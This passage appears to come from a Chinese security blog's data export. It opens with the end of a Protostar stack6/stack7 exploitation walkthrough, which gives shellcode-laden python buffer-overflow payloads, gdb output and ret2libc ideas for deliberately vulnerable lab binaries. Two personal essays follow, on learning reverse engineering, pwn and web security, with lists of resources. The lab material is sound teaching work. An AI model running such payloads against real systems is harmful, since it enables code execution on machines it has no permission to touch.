/bin/sleep0804e000-0804f000 rw-p 00005000 00:10 260 /bin/sleep0804f000-08070000 rw-p 00000000 00:00 0 [heap]b7e96000-b7e97000 rw-p 00000000 00:00 0 b7e97000-b7fd5000 r-xp 00000000 00:10 759 /lib/libc-2.11.2.sob7fd5000-b7fd6000 ---p 0013e000 00:10 759 /lib/libc-2.11.2.sob7fd6000-b7fd8000 r--p 0013e000 00:10 759 /lib/libc-2.11.2.sob7fd8000-b7fd9000 rw-p 00140000 00:10 759 /lib/libc-............bffeb000-c0000000 rw-p 00000000 00:00 0 [stack] 那就需要减个0x2000了，这时候就对了 12345(gdb) x /4i 0xb7fa7af80xb7fa7af8 &lt;translit_from_tbl+7160&gt;: call *%esp0xb7fa7afa &lt;translit_from_tbl+7162&gt;: add %eax,(%eax)0xb7fa7afc &lt;translit_from_tbl+7164&gt;: add %al,(%eax)0xb7fa7afe &lt;translit_from_tbl+7166&gt;: add %al,(%eax) 那么就可以了 12345root@protostar:/opt/protostar/bin# python -c &apos;print &quot;A&quot; * 80 + &quot;\\xf8\\x7a\\xfa\\xb7&quot; + &quot;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x03\\x00\\x00\\x00\\x6c\\x73\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80&quot;&apos; | ./stack6input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA󺶁AAAAAAAAAAA󺶪 XRfh-c榯sh1.txt final1 format0 format2 format4 heap1 heap3 net1 net3 rp-lin-x86 stack1 stack3 stack5 stack7final0 final2 format1 format3 heap0 heap2 net0 net2 net4 stack0 stack2 stack4 stack6 其他方法呢当然还有其他方法啦，如下： 1&quot;A&quot; * 80 + p32(system_addr) + p32(ret) + p32(binsh_addr) 当然binsh_addr懒得找的话也可以直接放栈上，反正没开随机化 1&quot;A&quot; * 80 + p32(system_addr) + p32(ret) + p32(binsh_addr) + &quot;binsh&quot; rop很神奇，很多思路的 stack7代码 1234567891011121314151617181920212223242526272829#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;char *getpath()&#123; char buffer[64]; unsigned int ret; printf(&quot;input path please: &quot;); fflush(stdout); gets(buffer); ret = __builtin_return_address(0); if((ret &amp; 0xb0000000) == 0xb0000000) &#123; printf(&quot;bzzzt (%p)\\n&quot;, ret); _exit(1); &#125; printf(&quot;got path %s\\n&quot;, buffer); return strdup(buffer);&#125;int main(int argc, char **argv)&#123; getpath();&#125; 可以看到这次连b开头的地址都不能覆盖 那么我暂时的想法是覆盖为程序段的地址，比如程序段的ret，就有很多，跟上次stack6一样的了，所以有时候做一题就可以了，不用做太多，就这个道理 因为你看内存就只有程序的地址不是b开头的 123456789101112131415root@protostar:/home/user# cat /proc/5199/maps 08048000-08049000 r-xp 00000000 00:10 4521 /opt/protostar/bin/stack708049000-0804a000 rwxp 00000000 00:10 4521 /opt/protostar/bin/stack7b7e96000-b7e97000 rwxp 00000000 00:00 0 b7e97000-b7fd5000 r-xp 00000000 00:10 759 /lib/libc-2.11.2.sob7fd5000-b7fd6000 ---p 0013e000 00:10 759 /lib/libc-2.11.2.sob7fd6000-b7fd8000 r-xp 0013e000 00:10 759 /lib/libc-2.11.2.sob7fd8000-b7fd9000 rwxp 00140000 00:10 759 /lib/libc-2.11.2.sob7fd9000-b7fdc000 rwxp 00000000 00:00 0 b7fde000-b7fe2000 rwxp 00000000 00:00 0 b7fe2000-b7fe3000 r-xp 00000000 00:00 0 [vdso]b7fe3000-b7ffe000 r-xp 00000000 00:10 741 /lib/ld-2.11.2.sob7ffe000-b7fff000 r-xp 0001a000 00:10 741 /lib/ld-2.11.2.sob7fff000-b8000000 rwxp 0001b000 00:10 741 /lib/ld-2.11.2.sobffeb000-c0000000 rwxp 00000000 00:00 0 [stack] 所以最终 12345root@protostar:/opt/protostar/bin# python -c &apos;print &quot;A&quot; * 80 + &quot;\\x83\\x83\\x04\\x08&quot; + &quot;\\xe4\\xfc\\xff\\xbf&quot; + &quot;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x03\\x00\\x00\\x00\\x6c\\x73\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80&quot;&apos; | ./stack6input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA彿¿j XRfh-c榯sh1.txt final1 format0 format2 format4 heap1 heap3 net1 net3 rp-lin-x86 stack1 stack3 stack5 stack7final0 final2 format1 format3 heap0 heap2 net0 net2 net4 stack0 stack2 stack4 stack6 收获发现一条快捷搜索的命令 objdump -M intel -d /opt/protostar/bin/stack7 | grep &quot;call.*eax&quot;","categories":[],"tags":[{"name":"Exploit Exercises Protostar,Stack","slug":"Exploit-Exercises-Protostar-Stack","permalink":"https://www.giantbranch.cn/tags/Exploit-Exercises-Protostar-Stack/"}]},{"title":"我的安全之路——二进制与逆向篇","slug":"我的安全之路——二进制与逆向篇","date":"2017-05-20T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2017/05/20/我的安全之路——二进制与逆向篇/","link":"","permalink":"https://www.giantbranch.cn/2017/05/20/我的安全之路——二进制与逆向篇/","excerpt":"","text":"write in my dormitory at ‏‎11:23:35 Saturday, May 20th, 2017 by giantbranch（其实当初想横跨web跟二进制的） ————致即将毕业的自己。 上一篇是《我的安全之路——Web安全篇》，，因为参加比赛，搞论文，就没什么时间写了，今天刚好答完辩，终于有时间开始写我的安全之路下篇了。虽然是5月20日写的，感觉写得太差，主要是技术也不厉害，就没发出来。既然写了，就发出来吧，现在看看有什么完善的再现在发出来吧，确实这个内容比web安全的经历难写，一个是文章题目的原因，另一个是自己接触也不长，经历不足，技术差。 为什么去搞逆向和二进制了在上一篇中我说过，我参加了一些比赛， 由于比赛的题目除了web，misc还有逆向和pwn等，其中逆向和pwn的分值的占比都是比较高的，尤其在高端的比赛中，逆向和pwn的占比也是很高，在国外更是如此。 艰难入门之路一开始就只是自己的孤军奋战，那基本就只能借助与搜索引擎：如何学习逆向，学习逆向的网站有哪些等。 那么你看到的基本都是首先肯定要有C,C++的编程能力，基本的都要理解透彻。（后来你回发现，当你逆向程序，在汇编层面去理解C++的时候，你会理解得更为透彻。） 之后就是汇编语言， 先从x86汇编学比较好吧，好书就是王爽的《汇编语言》，当时学校的《汇编语言程序设计》的课我也没选（因为我的那个群的学分已经满了，难得浪费分去选了，自学还可以挑战自我嘛），就看这本书，其实当时学得也并不是很好，用汇编编程的量不足（可以说几乎没编过汇编的感觉，感觉就编了几个helloworld），选了的话可以强制性地逼你去编。 再之后就自己编程序，查看其汇编代码进行理解。来到这一步，就可以尝试去做一些crackme了，或者破解一些简单的软件，这样就差不多入门了。 入门之后还是迷茫啊发现自己进步得非常慢，几乎没啥大的进步，应该是量还不够，而且由于各种原因，不能完全将时间只投入到逆向的学习与提高上面（这个点是个非常值得注意的点，这是使我有点后悔的一个点，做事一定要专注！【其实当时好像也迫不得已】）。实习的时候是搞渗透的，只能空闲的时间学习逆向，还有就是去参加比赛，但是我还是去当了一个web选手，线下比赛很容易就浪费了很多时间。 可以算入了逆向的门，之后一直想玩pwn，但确实难以入门啊，你要懂得汇编，调试，栈，堆等基本知识，你还要安装工具，你才能够理解和实践。重要的是当时的pwn的资料很少，我也没有大牛指导啊，搜索引擎搜到的资料也不多，可能当时没用谷歌吧，所以用好的搜索引擎也很重要，看英文资料也很重要，其实当时国外有个博客有个很好的系列文章，很多国内文章的原型来源于它（https://sploitfun.wordpress.com/）。 直到有一次，实习的时候刚好遇上公司的对外培训，我也去水了一下，跟安全研究员交流了一番，才拿到了一些资料，就更加激励我走上这一条路。 实习完就想转岗做安全研究员，当时面试的时候还没分析过什么漏洞，就学过蒸米的那个教程，面试官就叫我尝试去分析二进制漏洞，当时就搞了个ftp的缓冲区溢出漏洞，IE漏洞(CVE-2012-1889)分析与利用，IE漏洞CVE-2014-0282漏洞分析（这个是分析完ftp后分析的，收获良多，报告没发出来，踩了挺多坑的），也算了入了windows的漏洞分析的门了。 之后就是参加一些web偏多的比赛，还有准备毕业设计，还有这段时间一直在颓废了，不禁想问自己：为什么能够颓废这么久呢？ 未来之路现在已经选择了安全研究员之路了，虽然苦逼了一点，但是既然选择就热爱吧。 为什么想去当安全研究员呢，因为自从来到这个信息安全专业，我就基本确定走信息安全的道路了，后来也了解到tk教主就是安全研究员做起的，虽然并不是每个人都能成为tk，但是有机会还是可以试一下嘛。 关于pwn的一些好的博客，资源等（其实有些我收集了还没怎么看呢） 【更多等待大家补充了】 http://angelboy.logdown.com/ https://wizardforcel.gitbooks.io/sploitfun-linux-x86-exp-tut/content/ https://github.com/scwuaptx/HITCON-Training https://github.com/Kung-Pao-Chicken/ctf https://github.com/shellphish/how2heap https://pwnable.tw/ http://pwnable.kr/ https://etenal.me/archives/972#B1 https://heap-exploitation.dhavalkapil.com/","categories":[],"tags":[{"name":"我的安全之路","slug":"我的安全之路","permalink":"https://www.giantbranch.cn/tags/我的安全之路/"}]},{"title":"我的安全之路——Web安全篇","slug":"我的安全之路——Web安全篇","date":"2017-04-07T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2017/04/07/我的安全之路——Web安全篇/","link":"","permalink":"https://www.giantbranch.cn/2017/04/07/我的安全之路——Web安全篇/","excerpt":"","text":"write in my dormitory at ‏‎9:47:05 Friday, April 7, 2017 by giantbranch（其实当初想横跨web跟二进制的） ————致即将毕业的自己。 这是我的安全之路系列第一篇，敬请期待第二篇：《我的安全之路——二进制与逆向篇》 总览大一：基本都在学习学校的课程，C语言，C++，高数啊，不过分数还可以，在大一复习周还在php3小时光速入门呢 大二：web开发，大概在下学期5月份这样子开始web安全 大三：开始去参加比赛,刷题，学习各种ctf需要的知识，后期也接触了逆向 大四：继续学习二进制知识，分析各种漏洞，当然也有搞web，还参加世安杯，蓝盾杯总决赛，铁三数据赛 前情回顾我并没有像别人那样小学初中或者高中就已经在搞安全，那时候我们都在应试教育，或者沉迷游戏不能自拔吧，初高中我也是沉迷游戏，那时候也中病毒什么的，最多也会搞个360杀杀毒，重装系统什么的，自从有了第一次重装系统，之后一言不合就重装系统，其实当时也想过别人是怎么入侵电脑，入侵网站的，不过可能是环境和机遇的原因没有走上这条路。 后来高考要选专业了，其实当时是一心想考个好分数，也没考虑过选个什么专业，再过几天就要选专业了才去考虑的，选专业当然要自己喜欢的，我左思右想，我小时候不是很喜欢拆解各种小电器吗，也许对硬件会感兴趣，第一志愿报了电子科学与技术（而且后面的有网络工程啥的，就是没有信息安全），最后由于分数没够，没能去到那专业，由于是服从分配，分配到了有点关联的专业——信息安全专业，其实来之前对这个专业基本没多少了解的。 Web开发之路到了大学也不是一上来就沉迷信息安全学习，不能自拔，因为其实我们一开始跟软工上的课都是一样的，那就老老实实学C语言，高数，什么的。那又是如何接触到Web的呢，那是因为加入了计算机协会，其实在我们这组织并不是很厉害，只不过是当时有个活动是给协会会员讲课，我选择去讲网页开发，当时找了个Dreamweaver开发网页的教程，可以说是可视化的Web开发，非常的简单，从此就走上Web的坑咯。 其实大一还加入了电脑义修队，哈哈，一言不合就重装电脑，在大一快结束的时候被另一义修队员拉到一个校园微信公众号的一个团队去搞微信开发去了，自此走上web开发之路。什么查天气，发定位测距离就是入门的一些小实例，挺好玩的。之后在公众号里面开发了查校园网上网参数，失物招领，基于WeCenter的微信问答系统等。 这公众号凭借着师兄开发的查电费功能迅速“走红”，学校某个部门领导就发现了我们这个技术团队，所以后来就给这个部门开发了3个web，我写后台，当时主要是为了学习，也没用什么框架，确实也是学到了东西。 但是由于没用框架，当时无论是教程还是自己都是没有安全意识，触发了一个重大事件——自己开发的web网站被人报wooyun了。其实就是新手开发网站存在最经典的问题，我的问题存在于新闻详情页存在sql注入，更加坑爹的就是使用root连接的数据库，服务器直接被拿下咯。除此之外，还有明文储存密码。 web开发陆陆续续干了一年，对接下来的web安全之路的作用无疑非常巨大，可以说是web安全之路的“催化剂”。 我学过的web开发资源其实我学网站开发一开始都是在看视频，但是代码都是敲过一遍的，看你喜欢怎么学习咯 现在能让你们看到的就是我开发的班级网站了：http://13xinan.giantbranch.cn/ 现在已经改为静态站点了 W3C http://www.w3school.com.cn/ 十八哥的php教程（我看了1-5） 链接: https://pan.baidu.com/s/1cxRNHW 密码: fudj 还有的话在慕课网也看了不少php的教程，下面的路径差不多是看完了的 http://www.imooc.com/course/programdetail/pid/11 我没看过，或者看得少一点，但还是可以推荐的资源https://pan.baidu.com/s/1o6jA47S#list/path=%2F http://www.kancloud.cn/tag/PHP?name=PHP&amp;page=2 还有什么极客学院，实验楼，fenby等等一大堆，我都是有学过一点东西的 反正用什么资源是自己的事，现在资源可以说一辈子都不可能看完，不贪多，只求学会后举一反三，能按自己的想法写出自己网站，能学到东西。 Web安全之路由于那次入侵，我就尝试根据WooYun提交的报告，复现了一次报告者的入侵过程，收益良多。 况且由于我的专业是信息安全，由此踏上了Web安全之路。 之后在合天网安实验室“疯狂”做实验（那时候i春秋还没出来呢），还申请当了内测人员（新出的实验免费做，不过要写评价，还有实验中存在的问题等），之后邀请了合天网实验室来了一次见面会(http://www.hetianlab.com/html/news/Geek-jnu.html)，之后还搞了个合粉俱乐部，再之后就向合天投稿了一个实验(http://www.hetianlab.com/expc.do?ec=ECID9d6c0ca797abec2016092116115600001)从而成为了一位实验设计师了。 其实最重要的就是参加比赛，一有机会就报名参加，每次都是我们3个人报名，我们3个随便谁一看到有比赛，就马上相互提醒要报名，不管题目难不难，至少也得看一下，不行就赛后看一下writeup咯。 之后就边比赛，边刷CTF的题，还有安排其他一些知识点的深入学习，比如sql注入，xss等漏洞的学习，也深入python的编程。 还有的话就是我也是买了很多书的，看的web安全的书也是比较多了，看了一些后就没看了，主要是看了之后发现这个知道，直接翻到下一页了，一下就看完了。 其实还有一个就是参加了学习的开放实验，那时是metasploit和XSS，两个实验可以选，都是要自学，跟着做出点成绩来，后来我就设计了个逆向与二进制初探的一个开放实验指导给老师，师弟师妹你们有福了。 其实很难具体讲清楚，看我的博客就知道我大概的学习轨迹了。 我看过的web安全的书籍《Web前端黑客技术揭秘》，《白帽子讲Web安全》：感觉这两本讲的东西都是很宽，深入还是要自己来 《XSS跨站脚本攻击剖析与防御》：我都忘了具体内容了，哈哈 《Python黑帽子》：这是我网站看完，敲完代码的一本书，学完感觉确实不错，都是精华 《代码审计：企业级Web代码安全架构》：这个我浏览了一下，不去实践等于没看，还需要自己总结思考，最后才是自己的，但是我没这样做，汗~ 《Metasploit渗透测试魔鬼训练营》：前面的章节跟web安全也能沾边，后面的就是二进制的了 推荐一些好的学习资源sql注入：https://github.com/Audi-1/sqli-labs xss： http://xss-quiz.int21h.jp/答案：http://blog.knownsec.com/Knownsec_RD_Checklist/res/xss_quiz.txthttp://prompt.ml/0答案：https://github.com/cure53/XSSChallengeWiki/wiki/prompt.mlhttp://escape.alf.nu/答案：http://blog.csdn.net/u012763794/article/category/6246607 http://xss.pkav.net/xss/ 综合的： 合天网安实验室 http://www.hetianlab.com/i春秋学院 http://www.ichunqiu.com/实验吧 http://www.shiyanbar.com/知道创宇技能表：http://blog.knownsec.com/Knownsec_RD_Checklist/ （需要什么学什么就好，学完里面几乎是全才了，看看有什么自己需要的资源）各类安全工作技能：https://www.sec-wiki.com/skill/indexctf writeup: https://github.com/ctfs 安全导航： http://cmcc.ml/https://www.ctftools.com/down/http://navisec.it/ 一些好的网站： freebuf,看雪论坛，上面安全导航已经很多了，不写了 公众号： 黑白之道，腾讯玄武实验室，i春秋，红日俱乐部，SecWiki，E安全，安全牛….. 其实根据这些你们可以找到很多的了，还可以加入一些qq群 还有的话就是乌云镜像了 最后还要说说可能上面关于我的web安全之路并不是很完整，查看我的blog就知道我的大概的一个轨迹了，包括二进制安全的轨迹也可以看到 http://www.giantbranch.cn/http://blog.csdn.net/u012763794http://oldblog.giantbranch.cn/ 但是！！！，每个人都不一样，学习资源日新月异，基本都是差不多的，以上提供的仅作为参考，希望你走出更加牛逼的自己","categories":[],"tags":[{"name":"我的安全之路","slug":"我的安全之路","permalink":"https://www.giantbranch.cn/tags/我的安全之路/"}]}]}